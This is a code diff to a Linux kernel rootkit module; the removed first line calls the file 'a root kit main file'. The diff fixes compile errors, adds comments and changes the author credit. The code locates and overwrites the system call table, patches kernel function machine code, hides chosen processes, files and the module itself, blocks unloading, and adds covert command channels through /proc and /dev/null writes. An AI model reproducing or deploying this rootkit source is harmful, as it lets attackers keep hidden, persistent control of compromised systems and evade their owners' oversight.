@@ -1,6 +1,3 @@
-// a root kit main file
-
-//imports
 #include <asm/unistd.h>
 #include <linux/cred.h>
 #include <linux/fs.h>
@@ -23,29 +20,35 @@
 #include <linux/delay.h>
 #include <linux/version.h>
 
-#if LINUX_VERSION_CODE >= KERNAL_VERSION(4, 4, 0) && \
-	LINUX_VERSION_CODE < KERNAL_VERSION(4, 5, 0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
 
+// Copy-pasted from Linux sources as it's not provided in public headers
+// of newer Linux.
+// Might differ from one version of Linux kernel to another, so update as
+// necessary.
+// http://lxr.free-electrons.com/source/fs/proc/internal.h?v=4.4#L31
 struct proc_dir_entry {
-	unsigned int low_ino;
-	umode_t mode;
-	nlink_t nlink;
-	kuid_t uid;
-	kgid_t gid;
-	loff_t size;
-	const struct inode_operations *proc_iops;
-	const struct file_operations *proc_fops;
-	struct rb_root subdir;
-	struct rb_node subdrinode;
-	void *data;
-	atomic_t count;
-	atomic_t in_use;
-
-	struct completion *pde_unload_completion;
-	struct list_head pde_openers;
-	spinlock_t pde_unload_lock;
-	u8 namelen;
-	char name[];
+    unsigned int low_ino;
+    umode_t mode;
+    nlink_t nlink;
+    kuid_t uid;
+    kgid_t gid;
+    loff_t size;
+    const struct inode_operations *proc_iops;
+    const struct file_operations *proc_fops;
+    struct proc_dir_entry *parent;
+    struct rb_root subdir;
+    struct rb_node subdir_node;
+    void *data;
+    atomic_t count;         /* use count */
+    atomic_t in_use;        /* number of callers into module in progress; */
+                            /* negative -> it's going away RSN */
+    struct completion *pde_unload_completion;
+    struct list_head pde_openers;   /* who did ->open, but not ->release */
+    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+    u8 namelen;
+    char name[];
 };
 
 #endif
@@ -55,11 +58,11 @@ struct proc_dir_entry {
 #define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("krishpraanv")
+MODULE_AUTHOR("Maxim Biro <nurupo.contributions@gmail.com>");
+
 
 #define ARCH_ERROR_MESSAGE "Only i386 and x86_64 architectures are supported! " \
-		"It should be easy to port to new architectures though"
-
+    "It should be easy to port to new architectures though"
 
 #define DISABLE_W_PROTECTED_MEMORY \
     do { \
@@ -72,20 +75,30 @@ MODULE_AUTHOR("krishpraanv")
         write_cr0(read_cr0() | 0x10000); \
     } while (0);
 
+
+// ========== SYS_CALL_TABLE ==========
+
+
 #if defined __i386__
-	#define START_ADDRESS 0xc0000000
-	#define END_ADDRESS 0xd0000000
+    #define START_ADDRESS 0xc0000000
+    #define END_ADDRESS 0xd0000000
 #elif defined __x86_64__
-	#define START_ADDRESS 0xffffffff81000000
-	#define END_ADDRESS 0xffffffffa2000000
+    #define START_ADDRESS 0xffffffff81000000
+    #define END_ADDRESS 0xffffffffa2000000
 #else
-	#error ARCH_ERROR_MESSAGE
+    #error ARCH_ERROR_MESSAGE
 #endif
 
 void **sys_call_table;
 
- 
-
+/**
+ * Finds a system call table based on a heruistic.
+ * Note that the heruistic is not ideal, so it might find a memory region that
+ * looks like a system call table but is not actually a system call table, but
+ * it seems to work all the time on my systems.
+ *
+ * @return system call table on success, NULL on failure.
+ */
 void **find_syscall_table(void)
 {
     void **sctable;
@@ -117,6 +130,12 @@ skip:
 }
 
 
+// ========== END SYS_CALL_TABLE ==========
+
+
+// ========== HOOK LIST ==========
+
+
 struct hook {
     void *original_function;
     void *modified_function;
@@ -126,9 +145,24 @@ struct hook {
 
 LIST_HEAD(hook_list);
 
-int hool_create(void **modified_at_address, void *modified_function)
+/**
+ * Replaces a function pointer at some address with a new function pointer,
+ * keeping record of the original function pointer so that it could be
+ * restored later.
+ *
+ * @param modified_at_address Pointer to the address of where the function
+ * pointer that we want to replace is stored. The same address would be used
+ * when restoring the original funcion pointer back, so make sure it doesn't
+ * become invalid by the time you try to restore it back.
+ *
+ * @param modified_function Function pointer that we want to replace the
+ * original function pointer with.
+ *
+ * @return true on success, false on failure.
+ */
+int hook_create(void **modified_at_address, void *modified_function)
 {
-    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNAL);
+    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);
 
     if (!h) {
         return 0;
@@ -136,45 +170,75 @@ int hool_create(void **modified_at_address, void *modified_function)
 
     h->modified_at_address = modified_at_address;
     h->modified_function = modified_function;
+    list_add(&h->list, &hook_list);
 
     DISABLE_W_PROTECTED_MEMORY
     h->original_function = xchg(modified_at_address, modified_function);
     ENABLE_W_PROTECTED_MEMORY
 
     return 1;
-
 }
 
+/**
+ * Get original function pointer based on the one we overwrote it with.
+ * Useful when wanting to call the original function inside a hook.
+ *
+ * @param modified_function The function that overwrote the original one.
+ * @return original function pointer on success, NULL on failure.
+ */
 void *hook_get_original(void *modified_function)
 {
-    
     void *original_function = NULL;
     struct hook *h;
 
-    list_for_each_entry(h, *hook_list, list) {
+    list_for_each_entry(h, &hook_list, list) {
         if (h->modified_function == modified_function) {
-            original_function = h->original_fucntion;
+            original_function = h->original_function;
             break;
         }
     }
     return original_function;
 }
 
+/**
+ * Removes all hook records, restores the overwritten function pointers to
+ * their original value.
+ */
 void hook_remove_all(void)
 {
     struct hook *h, *tmp;
 
+    // make it so that instead of `modified_function` the `original_function`
+    // would get called again
     list_for_each_entry(h, &hook_list, list) {
         DISABLE_W_PROTECTED_MEMORY
         *h->modified_at_address = h->original_function;
         ENABLE_W_PROTECTED_MEMORY
     }
+    // a hack to let the changes made by the loop above propagate, as some
+    // process might be in the middle of executing our `modified_function`
+    // which calls the original function inside by getting it from the
+    // `hook_get_original()` call, which would return NULL if we `list_del()`
+    // everything, and, well, bad things happen if you try to use NULL as a
+    // function pointer and call into it.
+    // to get around this issue we:
+    // 1. make it so that instead of `modified_function` the
+    //    `original_function` would get called. this is done above.
+    // 2. sleep hopefully long enough to let all the proesses that are in the
+    //    middle of running `modified_function` to finish running that function
+    // 3. finally, remove all the elements from the list
     msleep(10);
     list_for_each_entry_safe(h, tmp, &hook_list, list) {
         list_del(&h->list);
         kfree(h);
     }
 }
+
+
+// ========== END HOOK LIST ==========
+
+
+// ========== HOOK EXAMPLES ==========
 
 unsigned long read_count = 0;
 
@@ -183,9 +247,10 @@ asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
     read_count ++;
 
     asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
-    original_read = hook_get_origianl(read);
+    original_read = hook_get_original(read);
     return original_read(fd, buf, count);
 }
+
 
 unsigned long write_count = 0;
 
@@ -197,6 +262,12 @@ asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
     original_write = hook_get_original(write);
     return original_write(fd, buf, count);
 }
+
+
+// ========== END HOOK EXAMPLES ==========
+
+
+// ========== ASM HOOK LIST ==========
 
 #if defined __i386__
     // push 0x00000000, ret
@@ -225,6 +296,10 @@ struct asm_hook {
 
 LIST_HEAD(asm_hook_list);
 
+/**
+ * Patches machine code of the original function to call another function.
+ * This function should not be called directly.
+ */
 void _asm_hook_patch(struct asm_hook *h)
 {
     DISABLE_W_PROTECTED_MEMORY
@@ -233,27 +308,43 @@ void _asm_hook_patch(struct asm_hook *h)
     ENABLE_W_PROTECTED_MEMORY
 }
 
+/**
+ * Patches machine code of a function so that it would call our function.
+ * Keeps record of the original function and its machine code so that it could
+ * be unpatched and patched again later.
+ *
+ * @param original_function Function to patch
+ *
+ * @param modified_function Function that should be called
+ *
+ * @return true on success, false on failure.
+ */
 int asm_hook_create(void *original_function, void *modified_function)
 {
-    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNAL);
+    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);
 
     if (!h) {
         return 0;
     }
 
-    h->original_function = original_function
-    h->modified_function = modified_function
+    h->original_function = original_function;
+    h->modified_function = modified_function;
     memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE)-1);
     list_add(&h->list, &asm_hook_list);
 
     _asm_hook_patch(h);
 
-    return 1; 
+    return 1;
 }
 
+/**
+ * Patches the original function to call the modified function again.
+ *
+ * @param modified_function Function that the original function was patched to
+ * call in asm_hook_create().
+ */
 void asm_hook_patch(void *modified_function)
 {
-
     struct asm_hook *h;
 
     list_for_each_entry(h, &asm_hook_list, list) {
@@ -264,13 +355,25 @@ void asm_hook_patch(void *modified_function)
     }
 }
 
+/**
+ * Unpatches machine code of the original function, so that it wouldn't call
+ * our function anymore.
+ * This function should not be called directly.
+ */
 void _asm_hook_unpatch(struct asm_hook *h)
 {
     DISABLE_W_PROTECTED_MEMORY
-    memcpy(h->original_fucntion, h->original_function, sizeof(ASM_HOOK_CODE)-1);
+    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE)-1);
     ENABLE_W_PROTECTED_MEMORY
 }
 
+/**
+ * Unpatches machine code of the original function, so that it wouldn't call
+ * our function anymore.
+ *
+ * @param modified_function Function that the original function was patched to
+ * call in asm_hook_create().
+ */
 void *asm_hook_unpatch(void *modified_function)
 {
     void *original_function = NULL;
@@ -287,22 +390,30 @@ void *asm_hook_unpatch(void *modified_function)
     return original_function;
 }
 
+/**
+ * Removes all hook records, unpatches all functions.
+ */
 void asm_hook_remove_all(void)
 {
-    struct asm_hook *h, tmp;
+    struct asm_hook *h, *tmp;
 
     list_for_each_entry_safe(h, tmp, &asm_hook_list, list) {
-        _asm_hook_patch(h);
+        _asm_hook_unpatch(h);
         list_del(&h->list);
         kfree(h);
     }
 }
 
+
+// ========== END ASM HOOK LIST ==========
+
+
+// ========== ASM HOOK EXAMPLES ==========
+
 unsigned long asm_rmdir_count = 0;
 
 asmlinkage long asm_rmdir(const char __user *pathname)
 {
-
     asm_rmdir_count ++;
 
     asmlinkage long (*original_rmdir)(const char __user *);
@@ -313,6 +424,13 @@ asmlinkage long asm_rmdir(const char __user *pathname)
     return ret;
 }
 
+
+// ========== END ASM HOOK EXAMPLES ==========
+
+
+// ========== PID LIST ==========
+
+
 struct pid_entry {
     unsigned long pid;
     struct list_head list;
@@ -322,7 +440,7 @@ LIST_HEAD(pid_list);
 
 int pid_add(const char *pid)
 {
-    struct pid_entry *p = kmalloc(sizeof(struct pid_entry), GFP_KERNAL);
+    struct pid_entry *p = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);
 
     if (!p) {
         return 0;
@@ -337,7 +455,6 @@ int pid_add(const char *pid)
 
 void pid_remove(const char *pid)
 {
-
     struct pid_entry *p, *tmp;
 
     unsigned long pid_num = simple_strtoul(pid, NULL, 10);
@@ -361,6 +478,13 @@ void pid_remove_all(void)
     }
 }
 
+
+// ========== END PID LIST ==========
+
+
+// ========== FILE LIST ==========
+
+
 struct file_entry {
     char *name;
     struct list_head list;
@@ -370,7 +494,7 @@ LIST_HEAD(file_list);
 
 int file_add(const char *name)
 {
-    struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNAL);
+    struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNEL);
 
     if (!f) {
         return 0;
@@ -378,7 +502,14 @@ int file_add(const char *name)
 
     size_t name_len = strlen(name) + 1;
 
+    // sanity check as `name` could point to some garbage without null anywhere nearby
     if (name_len -1 > NAME_MAX) {
+        kfree(f);
+        return 0;
+    }
+
+    f->name = kmalloc(name_len, GFP_KERNEL);
+    if (!f->name) {
         kfree(f);
         return 0;
     }
@@ -388,7 +519,6 @@ int file_add(const char *name)
     list_add(&f->list, &file_list);
 
     return 1;
-
 }
 
 void file_remove(const char *name)
@@ -416,13 +546,19 @@ void file_remove_all(void)
     }
 }
 
+
+// ========== END FILE LIST ==========
+
+
+// ========== HIDE ==========
+
+
 struct list_head *module_list;
 int is_hidden = 0;
 
 void hide(void)
 {
-
-    if (is_hidden){
+    if (is_hidden) {
         return;
     }
 
@@ -433,10 +569,10 @@ void hide(void)
     is_hidden = 1;
 }
 
+
 void unhide(void)
 {
-
-    if (!is_hidden){
+    if (!is_hidden) {
         return;
     }
 
@@ -445,22 +581,29 @@ void unhide(void)
     is_hidden = 0;
 }
 
+
+// ========== END HIDE ==========
+
+
+// ========== PROTECT ==========
+
+
 int is_protected = 0;
 
 void protect(void)
 {
-    if (is_protected){
+    if (is_protected) {
         return;
-        
-        try_module_get(THIS_MODULE);
-
-        is_protected = 1;
     }
+
+    try_module_get(THIS_MODULE);
+
+    is_protected = 1;
 }
 
-void unprotected(void)
+void unprotect(void)
 {
-    if (!is_protected){
+    if (!is_protected) {
         return;
     }
 
@@ -470,7 +613,9 @@ void unprotected(void)
 }
 
 
-struct file_operations *got_fop(const char *path)
+
+
+struct file_operations *get_fop(const char *path)
 {
     struct file *file;
 
@@ -479,7 +624,6 @@ struct file_operations *got_fop(const char *path)
     }
 
     struct file_operations *ret = (struct file_operations *) file->f_op;
-
     filp_close(file, 0);
 
     return ret;
@@ -531,7 +675,7 @@ struct file_operations *got_fop(const char *path)
 
 #endif
 
-//macros to use actually
+// Macros to actually use
 #define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
 #define READDIR_HOOK_END(NAME) FILLDIR_END(NAME) READDIR(NAME)
 
@@ -548,12 +692,11 @@ READDIR_HOOK_END(root)
 READDIR_HOOK_START(proc)
     struct pid_entry *p;
 
-    list_for_each_entry(p, *pid_list, list) {
-        if (simple_strtoul(name, NULL, 10) == p-> pid) {
+    list_for_each_entry(p, &pid_list, list) {
+        if (simple_strtoul(name, NULL, 10) == p->pid) {
             return 0;
         }
     }
-
 READDIR_HOOK_END(proc)
 
 READDIR_HOOK_START(sys)
@@ -562,11 +705,14 @@ READDIR_HOOK_START(sys)
     }
 READDIR_HOOK_END(sys)
 
+
 #undef FILLDIR_START
 #undef FILLDIR_END
 #undef READDIR
+
 #undef READDIR_HOOK_START
 #undef READDIR_HOOK_END
+
 
 int execute_command(const char __user *str, size_t length)
 {
@@ -635,11 +781,13 @@ int execute_command(const char __user *str, size_t length)
     return 1;
 }
 
-static size_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
+
+static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
 {
     if (execute_command(buf_user, count)) {
         return count;
     }
+
     int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
     original_write = asm_hook_unpatch(proc_fops_write);
     ssize_t ret = original_write(file, buf_user, count, p);
@@ -659,6 +807,7 @@ static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t c
 
     return ret;
 }
+
 
 int setup_proc_comm_channel(void)
 {
@@ -733,4 +882,25 @@ found:
 
     return 1;
 }
+
+
+static ssize_t devnull_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
+{
+    if (execute_command(buf_user, count)) {
+        return count;
+    }
+
+    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
+    original_write = hook_get_original(devnull_fops_write);
+    return original_write(file, buf_user, count, p);
+}
+
+int setup_devnull_comm_channel(void)
+{
+    hook_create(&get_fop("/dev/null")->write, devnull_fops_write);
+
+    return 1;
+}
+
+// ========== END COMM CHANNEL ==========
 
